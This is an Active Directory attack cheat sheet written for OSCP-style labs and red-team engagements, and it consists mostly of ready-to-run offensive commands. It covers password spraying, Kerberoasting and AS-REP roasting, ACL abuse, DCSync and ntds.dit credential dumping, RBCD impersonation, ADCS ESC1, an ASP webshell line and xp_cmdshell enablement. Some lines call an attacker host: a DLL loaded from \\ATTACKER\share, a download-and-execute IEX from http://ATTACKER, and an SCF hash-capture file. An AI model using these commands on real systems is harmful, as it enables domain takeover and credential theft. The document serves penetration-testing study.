# Active Directory Attack Path Cheat Sheet

Translated and integrated from Spanish Active Directory notes in `ruycr4ft/cheatsheets`, plus the local Windows guide. Use only in authorized labs and red-team engagements.

OSCP module source map: [OSCP Module Map](../references/OSCP%20Module%20Map.md#active-directory-module). The upstream module directory is currently a placeholder, while the upstream root README lists AD enumeration, main tools, Kerberoasting, AS-REP roasting, DCSync, Mimikatz, NTLM authentication, and Kerberos authentication as the intended topics.

## Core Flow

1. Identify domain, DCs, DNS names, and exposed services.
2. Enumerate users with Kerberos, SMB, RPC, LDAP, and web leaks.
3. Validate credentials carefully with SMB/WinRM/Kerberos.
4. Collect BloodHound data.
5. Attack Kerberos where applicable: AS-REP roast, Kerberoast, delegation/RBCD.
6. Abuse domain rights: GenericWrite, GenericAll, WriteOwner, WriteDACL, ForceChangePassword, ReadGMSAPassword, ReadLAPSPassword, DCSync.
7. Escalate host privileges through Windows local paths.
8. Dump only what is authorized and needed for the lab objective.

Related alternatives:

- [Service Enumeration Alternatives](Service%20Enumeration%20Alternatives.md)
- [Cloud and Misc Recon Alternatives](Cloud%20and%20Misc%20Recon%20Alternatives.md)

## Domain Recon

```bash
nmap -p- -sS --open --min-rate 5000 -Pn -n ip -oG allPorts
nmap -sC -sV -pPORTS ip -oN targeted
```

Common AD ports:

- `53` DNS
- `88` Kerberos
- `135` MSRPC
- `139/445` SMB
- `389/636` LDAP/LDAPS
- `464` Kerberos password change
- `593` RPC over HTTP
- `3268/3269` Global Catalog
- `5985/5986` WinRM
- `3389` RDP

## Kerberos User Enumeration

```bash
kerbrute userenum users.txt --dc dc.domain.local -d domain.local
kerbrute bruteuser passwords.txt --dc dc.domain.local -d domain.local username
kerbrute passwordspray -d domain.local users.txt 'Password123!'
```

Use password spraying carefully. In real environments, account lockout policy matters.

## SMB Enumeration

```bash
crackmapexec smb ip/24
crackmapexec smb ip -u user -p pass
crackmapexec winrm ip -u user -p pass
crackmapexec smb ip -u user -p pass --shares
crackmapexec smb ip -u user -p pass -M spider_plus
smbclient -L //ip/ -N
impacket-smbclient domain/user:pass@host.domain.local
```

Password spray with one known password:

```bash
crackmapexec smb ip -u users.txt -p 'Password123!' --continue-on-success
```

User/password pairs line by line:

```bash
crackmapexec smb ip -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

Mount a share for easier browsing:

```bash
sudo mount -t cifs '//ip/share' /mnt/share -o username=user,password=pass,domain=DOMAIN
```

From Windows:

```powershell
Get-SmbShare
net use \\ip\IPC$ /user:DOMAIN\user pass
net view \\ip\
net use X: \\ip\SYSVOL /user:DOMAIN\user pass
```

## RPC Enumeration

Null session user list:

```bash
rpcclient -N -U '' domain.local -c enumdomusers
```

Extract usernames:

```bash
rpcclient -N -U '' domain.local -c enumdomusers | grep -oP '\[\D*?\]' | tr -d '[]' | tee users.txt
```

Query descriptions for leaked passwords:

```bash
for user in $(cat users.txt); do rpcclient -N -U "" domain.local -c "queryuser $user"; done | grep -E "User Name|Description"
```

RPC over `135` only:

```bash
impacket-rpcmap 'ncacn_ip_tcp:ip'
impacket-rpcdump domain/user:pass@host.domain.local
```

If `spoolsv` is exposed, check print-spooler attack surface.

## LDAP Enumeration

```bash
ldapsearch -H ldap://ip -x -s base namingcontexts
ldapsearch -H ldap://ip -x -b "DC=domain,DC=local"
ldapsearch -H ldap://ip -D 'user@domain.local' -w 'pass' -x -b "DC=domain,DC=local"
ldapdomaindump -u 'DOMAIN\user' -p 'pass' ip
```

Review user descriptions, group memberships, SPNs, LAPS fields, and delegation settings.

## BloodHound

From attacker:

```bash
bloodhound-python -u user -p pass -d domain.local -dc dc.domain.local -ns ip --dns-tcp --zip -c All
```

From Windows target:

```powershell
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
```

Alternative:

```powershell
.\SharpHound.exe -c all
```

## Kerberos Attacks

### AS-REP Roast

Needs valid usernames. No password required if the user has pre-authentication disabled.

```bash
impacket-GetNPUsers domain.local/ -no-pass -usersfile users.txt -dc-ip ip
john asrep.hashes --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.hashes rockyou.txt
```

Windows:

```powershell
.\Rubeus.exe asreproast /user:user /domain:domain.local /dc:dc.domain.local
```

### Kerberoasting

Requires valid domain credentials.

```bash
impacket-GetUserSPNs 'domain.local/user:pass' -request -dc-ip ip
john kerberoast.hashes --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast.hashes rockyou.txt
```

Windows:

```powershell
.\Rubeus.exe kerberoast /creduser:DOMAIN\user /credpassword:pass
```

## Domain Rights Abuse

### GenericWrite On User

Add an SPN, then Kerberoast the account:

```powershell
Set-DomainObject -Identity targetUser -Set @{serviceprincipalname='nonexistent/service'}
Get-DomainSPNTicket -SPN 'nonexistent/service'
```

Native Windows:

```powershell
setspn -a service/domain.local DOMAIN\targetUser
```

If cracking is unrealistic, set `scriptpath` for a logon script when the scenario allows it:

```powershell
Set-DomainObject -Identity targetUser -Set @{scriptpath='path\to\script.ps1'}
```

### WriteOwner On Group

Become owner, grant yourself rights, add yourself to the group:

```powershell
Set-DomainObjectOwner -Identity "Group Name" -OwnerIdentity user
Add-DomainObjectAcl -TargetIdentity "Group Name" -Rights All -PrincipalIdentity user
net group "Group Name" user /add /domain
```

If `net` is unavailable:

```powershell
Add-DomainGroupMember -Identity 'Group Name' -Members 'user' -Credential $cred
```

Log out and back in if the token does not update.

### WriteOwner On User

```powershell
Set-DomainObjectOwner -Identity targetUser -OwnerIdentity controlledUser
Add-DomainObjectAcl -TargetIdentity targetUser -Rights ResetPassword -PrincipalIdentity controlledUser
$newpass = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
Set-DomainUserPassword -Identity targetUser -AccountPassword $newpass
```

### ForceChangePassword / GenericAll On User

From Linux:

```bash
net rpc password targetUser 'NewPass123!' -U 'DOMAIN/controlledUser%pass' -S dc.domain.local
```

With NT hash:

```bash
net rpc password targetUser 'NewPass123!' -U 'DOMAIN/controlledUser%NT_HASH' -S dc.domain.local --pw-nt-hash
```

From Windows:

```powershell
net user targetUser NewPass123! /domain
```

### WriteDACL To DCSync

Grant DCSync rights:

```powershell
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity user -Rights DCSync
```

Dump with secretsdump:

```bash
impacket-secretsdump domain.local/user:pass@dc.domain.local
```

### ReadGMSAPassword

Manual PowerShell:

```powershell
$gmsa = (Get-ADServiceAccount -Identity 'account$' -Properties 'msDS-ManagedPassword').'msDS-ManagedPassword'
$sec = (ConvertFrom-ADManagedPasswordBlob $gmsa).SecureCurrentPassword
$cred = New-Object System.Management.Automation.PSCredential 'DOMAIN\account$', $sec
Invoke-Command -ComputerName host -Credential $cred -Command { whoami }
```

Automated:

```bash
python3 gMSADumper.py -u user -p pass -d domain.local -l domain.local
```

### ReadLAPSPassword

```bash
ldapsearch -x -H ldap://ip -D user@domain.local -w 'pass' -b "DC=domain,DC=local" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

Alternative tool:

```bash
pyLAPS.py --action get -d domain.local -u user -p pass --dc-ip dc_ip
```

### RBCD / GenericAll On Computer

High-level flow:

1. Add or control a machine account.
2. Write `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target computer.
3. Request a service ticket impersonating a privileged user.
4. Use the ticket against CIFS/HTTP/etc.

Impacket path:

```bash
impacket-addcomputer domain.local/user:pass -computer-name FAKE$ -computer-pass 'Passw0rd!'
impacket-rbcd domain.local/user:pass -delegate-from FAKE$ -delegate-to TARGET$ -action write
impacket-getST -spn cifs/target.domain.local -impersonate administrator domain.local/FAKE$:Passw0rd!
KRB5CCNAME=administrator.ccache impacket-psexec -k -no-pass domain.local/administrator@target.domain.local
```

### ADCS ESC1

If Certipy or BloodHound shows a template where low-privileged users can enroll, the enrollee can supply subject, and client authentication is enabled, test ESC1 in scope.

```bash
certipy find -u user@domain.local -p pass -dc-ip dc_ip -vulnerable -stdout
certipy req -u user@domain.local -p pass -ca CA-NAME -template TEMPLATE -upn administrator@domain.local -dc-ip dc_ip
certipy auth -pfx administrator.pfx -dc-ip dc_ip
```

Use the recovered NT hash with [Pass-the-Hash Cheat Sheet](Pass-the-Hash%20Cheat%20Sheet.md).

### NTLM Theft From Writable Share

If an AD user or automation reads a writable share:

1. Generate an LNK/SCF-style artifact in lab scope.
2. Start `responder`.
3. Place the artifact in the writable share.
4. Crack captured NetNTLMv2 offline.

```bash
responder -I tun0
john captured.hash --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt
```

### Authentication Relay

If SMB signing is disabled and relay is in scope, consider NTLM relay paths. Confirm:

- SMB signing status
- target service accepts relayed auth
- captured auth source is allowed by scope

### PXE Boot Image Retrieval

If PXE/TFTP services are exposed in an AD network:

- inspect DHCP/PXE hints
- retrieve boot images from TFTP
- mount/extract image
- search for deployment credentials and scripts

## Privileged Group / Local Privilege Paths

### DnsAdmins

If you are in `DnsAdmins`, DNS server plugin DLL loading can lead to code execution when DNS restarts.

```powershell
dnscmd dc /config /serverlevelplugindll \\ATTACKER\share\payload.dll
sc.exe stop dns
sc.exe start dns
```

### Server Operators

Abuse service configuration rights:

```powershell
sc.exe config VSS binpath= "C:\Path\payload.exe"
sc.exe stop VSS
sc.exe start VSS
```

### SeBackupPrivilege

Use DiskShadow to expose a volume shadow copy, then copy `ntds.dit` and SYSTEM for offline extraction.

DiskShadow script:

```text
set context persistent nowriters
add volume c: alias snap
create
expose %snap% z:
```

Commands:

```powershell
diskshadow /s snap.dsh
robocopy /b z:\windows\ntds . ntds.dit
reg save hklm\system C:\Temp\system
```

Extract:

```bash
impacket-secretsdump -ntds ntds.dit -system system local
```

### SeImpersonatePrivilege

Check:

```cmd
whoami /priv
```

In labs, use a Potato-family exploit compatible with the OS/build and available CLSIDs. Prefer confirming OS/build first.

### Azure AD Sync

If `C:\Program Files\Microsoft Azure AD Sync` exists, check for ADSync credential exposure paths.

```powershell
cd "C:\Program Files\Microsoft Azure AD Sync\Bin"
C:\ProgramData\AdDecrypt.exe -FullSQL
```

### Account Operators

Create a user, then add it to a group that grants useful rights:

```cmd
net user newuser NewPass123! /add /domain
net group "Target Group" newuser /add /domain
```

## Windows Local Checks

```cmd
whoami
whoami /priv
whoami /groups
hostname
ipconfig /all
net user
net localgroup administrators
systeminfo
cmdkey /list
```

PowerShell:

```powershell
Get-LocalUser
Get-LocalGroupMember Administrators
Get-SmbShare
Get-NetFirewallRule -Direction Outbound -Action Block -Enabled True
```

PowerUp / WinPEAS are useful for broad local enumeration in labs.

## Credential Artifacts

### PowerShell Credential XML

If you find exported `PSCredential` XML and can decrypt in the same user context:

```powershell
$cred = Import-CliXml -Path C:\path\cred.xml
$cred.GetNetworkCredential() | Format-List *
```

### SecureString With Key

If script contains encrypted SecureString and key:

```powershell
$secure = $encrypted | ConvertTo-SecureString -Key $key
$ptr = [Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($secure)
[Runtime.InteropServices.Marshal]::PtrToStringUni($ptr)
[Runtime.InteropServices.Marshal]::ZeroFreeCoTaskMemUnicode($ptr)
```

### Cached Credentials

```cmd
cmdkey /list
```

If saved creds exist:

```powershell
runas /user:DOMAIN\Administrator /savecred "powershell -ExecutionPolicy Bypass -File C:\Path\script.ps1"
```

## WinRM / PowerShell Remoting

```bash
evil-winrm -i ip -u user -p pass
evil-winrm -i ip -u user -H NT_HASH
```

PowerShell credential object:

```powershell
$pass = ConvertTo-SecureString 'pass' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', $pass)
Invoke-Command -ComputerName host -Credential $cred -ScriptBlock { whoami }
```

Kerberos remoting from Linux may require `/etc/krb5.conf` configured with the domain realm and KDC.

## IIS / ASP / ASPX

Classic ASP command execution test:

```asp
<%response.write CreateObject("WScript.Shell").Exec("cmd /c whoami").StdOut.ReadAll()%>
```

PowerShell encoded command payloads must be UTF-16LE before Base64:

```bash
echo -n "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PS.ps1')" | iconv -t utf-16le | base64 -w 0
```

## MSSQL

```bash
impacket-mssqlclient user:pass@ip -windows-auth
impacket-mssqlclient host.domain.local -k
```

Useful SQL:

```sql
select @@version;
select name, database_id from sys.databases;
select name from sys.server_principals;
EXEC sp_configure 'show advanced options',1;RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

## Tickets

If you have a TGS/TGT cache:

```bash
export KRB5CCNAME=ticket.ccache
klist
impacket-mssqlclient host.domain.local -k
impacket-psexec -k -no-pass domain.local/user@host.domain.local
```

## Older CVE Checks

Use only after confirming OS/build and lab scope.

- `MS14-068`: old Kerberos PAC issue on vulnerable Windows Server 2008 domain controllers.
- `MS17-010`: EternalBlue-era SMBv1 issue.
- `MS11-046`: old Windows kernel local privilege escalation for specific builds.
- `CVE-2021-1675 / PrintNightmare`: print spooler path, check spooler exposure first.
- `AlwaysInstallElevated`: privilege escalation when both HKCU and HKLM policy values are `1`.

AlwaysInstallElevated checks:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## Hash Capture From Writable SMB Shares

If a user browses a writable SMB share, SCF/LNK-style coercion may capture NetNTLMv2 in lab conditions.

SCF example:

```ini
[Shell]
Command=2
IconFile=\\ATTACKER\share\pwned.ico
[Taskbar]
Command=ToggleDesktop
```

Listener:

```bash
responder -I tun0
```
